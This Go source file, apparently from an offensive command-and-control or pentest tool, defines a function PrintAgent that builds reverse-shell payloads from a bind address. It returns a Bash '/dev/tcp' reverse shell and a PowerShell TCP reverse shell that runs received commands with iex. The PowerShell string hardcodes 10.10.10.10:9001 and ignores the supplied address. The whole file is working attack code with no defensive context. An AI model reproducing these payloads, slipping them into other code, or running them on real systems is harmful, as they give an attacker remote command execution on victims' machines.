package agents

import (
	"strings"
)

func PrintAgent(bind string) (string, string) {
	//split bind into ip and port
	ip := strings.Split(bind, ":")[0]
	port := strings.Split(bind, ":")[1]
	if ip == "localhost" {
		ip = "127.0.0.1"
	}
	var cmd = "sh -i >& /dev/tcp/" + string(ip) + "/" + string(port) + " 0>&1"

	var cmd_win = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""

	return cmd, cmd_win

}
